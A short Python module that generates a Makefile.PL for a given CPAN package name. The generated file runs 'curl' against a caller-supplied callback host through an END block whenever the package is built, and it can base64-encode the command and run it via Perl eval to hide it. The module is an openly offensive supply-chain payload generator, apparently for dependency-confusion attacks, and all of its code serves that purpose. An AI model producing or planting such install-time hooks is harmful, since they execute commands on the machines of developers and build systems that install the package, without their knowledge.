"""Generate Perl payload for CPAN packages."""
from __future__ import annotations

import base64
from typing import Optional


def _encode(cmd: str, method: Optional[str]) -> str:
    if method == "b64":
        enc = base64.b64encode(cmd.encode()).decode()
        return f"perl -MMIME::Base64 -e 'eval decode_base64(\"{enc}\")'"
    return cmd


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a simple Makefile.PL invoking ``callback`` when built."""
    cmd = _encode(f"curl -m5 {callback}", encode)
    return (
        f"use ExtUtils::MakeMaker;\n"
        f"WriteMakefile(NAME => '{package}');\n"
        f"END {{ system('{cmd}') }}\n"
    )
